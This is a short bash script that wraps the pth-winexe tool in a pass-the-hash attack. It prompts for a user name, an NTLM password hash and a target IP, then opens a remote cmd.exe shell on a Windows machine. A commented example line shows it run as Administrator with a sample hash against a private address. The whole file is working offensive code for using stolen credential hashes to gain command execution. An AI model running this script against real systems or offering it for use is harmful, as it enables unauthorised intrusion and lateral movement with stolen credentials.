#!/bin/bash

#pth-winexe -U Administrator%00000000000000000000000000000000:2892d26cdf84d7a70e2eb3b9f05c425e //192.168.123.10 cmd.exe

echo "User: "
read user

echo "Hash: "
read hash

echo "IP: "
read ip

pth-winexe -U $user%00000000000000000000000000000000:$hash //$ip cmd.exe 
